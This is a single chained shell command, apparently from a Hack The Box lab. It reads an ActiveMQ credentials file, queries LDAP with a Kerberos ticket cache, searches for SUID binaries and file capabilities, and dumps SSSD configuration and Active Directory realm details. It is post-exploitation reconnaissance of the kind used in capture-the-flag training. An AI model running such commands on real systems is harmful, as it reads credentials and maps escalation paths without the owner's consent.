list.value: echo "=CREDS_ENC="; cat /opt/activemq/conf/credentials-enc.properties; echo "=LDAP_GSSAPI="; KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd ldapsearch -Y GSSAPI -H ldap://localhost -b "dc=king,dc=htb" "(objectClass=user)" sAMAccountName userPrincipalName 2>&1 | head -60; echo "=SUID_SGID="; find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc | head -30; echo "=CAPABILITIES="; getcap -r / 2>/dev/null | head -20; echo "=SSSD_DB_FILES="; find /var/lib/sss -type f 2>/dev/null; ls -la /var/lib/sss/ 2>/dev/null; echo "=SSSD_CONF="; find /etc/sssd -type f 2>/dev/null | xargs cat 2>/dev/null; echo "=NET_ADS_INFO="; KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd net ads info 2>&1; echo "=REALM_DISCOVER="; realm discover 2>/dev/null; realm list 2>/dev/null
